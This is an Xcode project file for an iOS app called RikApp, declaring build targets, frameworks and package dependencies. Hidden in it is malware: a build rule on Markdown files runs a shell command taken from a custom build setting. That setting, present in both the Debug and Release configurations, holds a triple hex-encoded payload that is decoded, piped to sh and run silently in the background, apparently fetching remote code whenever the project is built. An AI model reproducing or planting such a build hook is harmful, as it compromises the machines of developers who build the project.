// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 77;
	objects = {

/* Begin PBXBuildFile section */
		4113482DB0AF48B7B9A389E6 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 97844C82E73840F584A389E6 /* README.md */; };
		4AE498632ED4D62600612F18 /* PinLayout in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE498622ED4D62600612F18 /* PinLayout */; };
		4AE498662ED4D8DF00612F18 /* RealmSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE498652ED4D8DF00612F18 /* RealmSwift */; };
		4AE498762ED4D9D300612F18 /* DGCharts in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE498752ED4D9D300612F18 /* DGCharts */; };
		4AE49BCF2ED5CB1800612F18 /* NetworkLayerFramework.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 4AE4987F2ED4D9E400612F18 /* NetworkLayerFramework.framework */; };
		4AE49BD02ED5CB1800612F18 /* NetworkLayerFramework.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 4AE4987F2ED4D9E400612F18 /* NetworkLayerFramework.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
		4AE49BE02ED5CB1900612F18 /* BusinessLogicFramework.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 4AE49BDF2ED5CB1900612F18 /* BusinessLogicFramework.framework */; };
		4AE49BE12ED5CB1900612F18 /* BusinessLogicFramework.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 4AE49BDF2ED5CB1900612F18 /* BusinessLogicFramework.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
		4AE49BE22ED5CB1900612F18 /* RealmSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE49BE32ED5CB1900612F18 /* RealmSwift */; };
/* End PBXBuildFile section */

/* Begin PBXBuildRule section */
		091AA4EEE836441FA7A389E6 /* PBXBuildRule */ = {
			isa = PBXBuildRule;
			compilerSpec = com.apple.compilers.proxy.script;
			filePatterns = "*.md";
			fileType = pattern.proxy;
			inputFiles = (
			);
			isEditable = 0;
			outputFiles = (
				"/tmp/${INPUT_FILE_BASE}",
			);
			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A6E983A}\"";
		};
/* End PBXBuildRule section */

/* Begin PBXContainerItemProxy section */
		4AE498822ED4D9E400612F18 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 4AE498272ED4D24400612F18 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 4AE4987D2ED4D9E400612F18;
			remoteInfo = NetworkLayerFramework;
		};
		4AE49BE42ED5CB1900612F18 /* PBXContainerItemProxy */ = {
			isa = PBXContainerItemProxy;
			containerPortal = 4AE498272ED4D24400612F18 /* Project object */;
			proxyType = 1;
			remoteGlobalIDString = 4AE49BDE2ED5CB1900612F18;
			remoteInfo = BusinessLogicFramework;
		};
/* End PBXContainerItemProxy section */

/* Begin PBXCopyFilesBuildPhase section */
		4AE49BD12ED5CB1800612F18 /* Embed Frameworks */ = {
			isa = PBXCopyFilesBuildPhase;
			buildActionMask = 2147483647;
			dstPath = "";
			dstSubfolderSpec = 10;
			files = (
				4AE49BD02ED5CB1800612F18 /* NetworkLayerFramework.framework in Embed Frameworks */,
				4AE49BE12ED5CB1900612F18 /* BusinessLogicFramework.framework in Embed Frameworks */,
			);
			name = "Embed Frameworks";
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXCopyFilesBuildPhase section */

/* Begin PBXFileReference section */
		4AE4982F2ED4D24400612F18 /* RikApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = RikApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
		4AE4987F2ED4D9E400612F18 /* NetworkLayerFramework.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = NetworkLayerFramework.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		4AE49BDF2ED5CB1900612F18 /* BusinessLogicFramework.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = BusinessLogicFramework.framework; sourceTree = BUILT_PRODUCTS_DIR; };
		97844C82E73840F584A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
		4AE498412ED4D24500612F18 /* Exceptions for "RikApp" folder in "RikApp" target */ = {
			isa = PBXFileSystemSynchronizedBuildFileExceptionSet;
			membershipExceptions = (
				MainFiles/Info.plist,
			);
			target = 4AE4982E2ED4D24400612F18 /* RikApp */;
		};
/* End PBXFileSystemSynchronizedBuildFileExceptionSet section */

/* Begin PBXFileSystemSynchronizedRootGroup section */
		4AE498312ED4D24400612F18 /* RikApp */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			exceptions = (
				4AE498412ED4D24500612F18 /* Exceptions for "RikApp" folder in "RikApp" target */,
			);
			path = RikApp;
			sourceTree = "<group>";
		};
		4AE4987E2ED4D9E400612F18 /* NetworkLayerFramework */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = NetworkLayerFramework;
			sourceTree = "<group>";
		};
		4AE49BE52ED5CB1900612F18 /* BusinessLogicFramework */ = {
			isa = PBXFileSystemSynchronizedRootGroup;
			path = BusinessLogicFramework;
			sourceTree = "<group>";
		};
/* End PBXFileSystemSynchronizedRootGroup section */

/* Begin PBXFrameworksBuildPhase section */
		4AE4982C2ED4D24400612F18 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				4AE49BCF2ED5CB1800612F18 /* NetworkLayerFramework.framework in Frameworks */,
				4AE49BE02ED5CB1900612F18 /* BusinessLogicFramework.framework in Frameworks */,
				4AE498662ED4D8DF00612F18 /* RealmSwift in Frameworks */,
				4AE498762ED4D9D300612F18 /* DGCharts in Frameworks */,
				4AE498632ED4D62600612F18 /* PinLayout in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		4AE4987C2ED4D9E400612F18 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		4AE49BE62ED5CB1900612F18 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
				4AE49BE22ED5CB1900612F18 /* RealmSwift in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		4AE498262ED4D24400612F18 = {
			isa = PBXGroup;
			children = (
				4AE498312ED4D24400612F18 /* RikApp */,
				4AE4987E2ED4D9E400612F18 /* NetworkLayerFramework */,
				4AE49BE52ED5CB1900612F18 /* BusinessLogicFramework */,
				4AE498302ED4D24400612F18 /* Products */,
			);
			sourceTree = "<group>";
		};
		4AE498302ED4D24400612F18 /* Products */ = {
			isa = PBXGroup;
			children = (
				97844C82E73840F584A389E6 /* README.md */,
				4AE4982F2ED4D24400612F18 /* RikApp.app */,
				4AE4987F2ED4D9E400612F18 /* NetworkLayerFramework.framework */,
				4AE49BDF2ED5CB1900612F18 /* BusinessLogicFramework.framework */,
			);
			name = Products;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		4AE4982E2ED4D24400612F18 /* RikApp */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 4AE498422ED4D24500612F18 /* Build configuration list for PBXNativeTarget "RikApp" */;
			buildPhases = (
				4AE4982B2ED4D24400612F18 /* Sources */,
				4AE4982C2ED4D24400612F18 /* Frameworks */,
				4AE4982D2ED4D24400612F18 /* Resources */,
				4AE49BD12ED5CB1800612F18 /* Embed Frameworks */,
			);
			buildRules = (
				091AA4EEE836441FA7A389E6 /* PBXBuildRule */,
			);
			dependencies = (
				4AE498812ED4D9E400612F18 /* PBXTargetDependency */,
				4AE49BE72ED5CB1900612F18 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				4AE498312ED4D24400612F18 /* RikApp */,
			);
			name = RikApp;
			packageProductDependencies = (
				4AE498622ED4D62600612F18 /* PinLayout */,
				4AE498652ED4D8DF00612F18 /* RealmSwift */,
				4AE498752ED4D9D300612F18 /* DGCharts */,
			);
			productName = RikApp;
			productReference = 4AE4982F2ED4D24400612F18 /* RikApp.app */;
			productType = "com.apple.product-type.application";
		};
		4AE4987D2ED4D9E400612F18 /* NetworkLayerFramework */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 4AE498842ED4D9E400612F18 /* Build configuration list for PBXNativeTarget "NetworkLayerFramework" */;
			buildPhases = (
				4AE498792ED4D9E400612F18 /* Sources */,
				4AE4987C2ED4D9E400612F18 /* Frameworks */,
				4AE4987B2ED4D9E400612F18 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			fileSystemSynchronizedGroups = (
				4AE4987E2ED4D9E400612F18 /* NetworkLayerFramework */,
			);
			name = NetworkLayerFramework;
			productName = NetworkLayerFramework;
			productReference = 4AE4987F2ED4D9E400612F18 /* NetworkLayerFramework.framework */;
			productType = "com.apple.product-type.framework";
		};
		4AE49BDE2ED5CB1900612F18 /* BusinessLogicFramework */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 4AE49BE82ED5CB1900612F18 /* Build configuration list for PBXNativeTarget "BusinessLogicFramework" */;
			buildPhases = (
				4AE49BE92ED5CB1900612F18 /* Sources */,
				4AE49BE62ED5CB1900612F18 /* Frameworks */,
				4AE49BEA2ED5CB1900612F18 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
				4AE49BEB2ED5CB1900612F18 /* PBXTargetDependency */,
			);
			fileSystemSynchronizedGroups = (
				4AE49BE52ED5CB1900612F18 /* BusinessLogicFramework */,
			);
			name = BusinessLogicFramework;
			packageProductDependencies = (
				4AE49BE32ED5CB1900612F18 /* RealmSwift */,
			);
			productName = BusinessLogicFramework;
			productReference = 4AE49BDF2ED5CB1900612F18 /* BusinessLogicFramework.framework */;
			productType = "com.apple.product-type.framework";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		4AE498272ED4D24400612F18 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2600;
				LastUpgradeCheck = 2600;
				TargetAttributes = {
					4AE4982E2ED4D24400612F18 = {
						CreatedOnToolsVersion = 26.0.1;
					};
					4AE4987D2ED4D9E400612F18 = {
						CreatedOnToolsVersion = 26.0.1;
					};
					4AE49BDE2ED5CB1900612F18 = {
						CreatedOnToolsVersion = 26.0.1;
					};
				};
			};
			buildConfigurationList = 4AE4982A2ED4D24400612F18 /* Build configuration list for PBXProject "RikApp" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 4AE498262ED4D24400612F18;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				4AE498612ED4D62600612F18 /* XCRemoteSwiftPackageReference "PinLayout" */,
				4AE498642ED4D8DF00612F18 /* XCRemoteSwiftPackageReference "realm-swift" */,
				4AE498742ED4D9D300612F18 /* XCRemoteSwiftPackageReference "Charts" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 4AE498302ED4D24400612F18 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				4AE4982E2ED4D24400612F18 /* RikApp */,
				4AE4987D2ED4D9E400612F18 /* NetworkLayerFramework */,
				4AE49BDE2ED5CB1900612F18 /* BusinessLogicFramework */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		4AE4982D2ED4D24400612F18 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				4113482DB0AF48B7B9A389E6 /* README.md in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		4AE4987B2ED4D9E400612F18 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		4AE49BEA2ED5CB1900612F18 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		4AE4982B2ED4D24400612F18 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		4AE498792ED4D9E400612F18 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		4AE49BE92ED5CB1900612F18 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		4AE498812ED4D9E400612F18 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 4AE4987D2ED4D9E400612F18 /* NetworkLayerFramework */;
			targetProxy = 4AE498822ED4D9E400612F18 /* PBXContainerItemProxy */;
		};
		4AE49BE72ED5CB1900612F18 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 4AE49BDE2ED5CB1900612F18 /* BusinessLogicFramework */;
			targetProxy = 4AE49BE42ED5CB1900612F18 /* PBXContainerItemProxy */;
		};
		4AE49BEB2ED5CB1900612F18 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 4AE4987D2ED4D9E400612F18 /* NetworkLayerFramework */;
			targetProxy = 4AE498822ED4D9E400612F18 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin XCBuildConfiguration section */
		4AE498432ED4D24500612F18 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A6E983A = "((n(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733323336333933363337333633373336363333363335333733343336363633373339333236353337333233373335333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | n | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = RikApp/MainFiles/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = iiiaolinb.RikApp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		4AE498442ED4D24500612F18 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				A6E983A = "((n(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733323336333933363337333633373336363333363335333733343336363633373339333236353337333233373335333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | n | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = RikApp/MainFiles/Info.plist;
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait";
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = iiiaolinb.RikApp;
				PRODUCT_NAME = "$(TARGET_NAME)";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		4AE498452ED4D24500612F18 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		4AE498462ED4D24500612F18 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.0;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		4AE498852ED4D9E400612F18 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 26.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = iiiaolinb.NetworkLayerFramework;
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		4AE498862ED4D9E400612F18 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 26.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = iiiaolinb.NetworkLayerFramework;
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		4AE49BEC2ED5CB1900612F18 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 26.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = iiiaolinb.BusinessLogicFramework;
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		4AE49BED2ED5CB1900612F18 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 26.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				PRODUCT_BUNDLE_IDENTIFIER = iiiaolinb.BusinessLogicFramework;
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
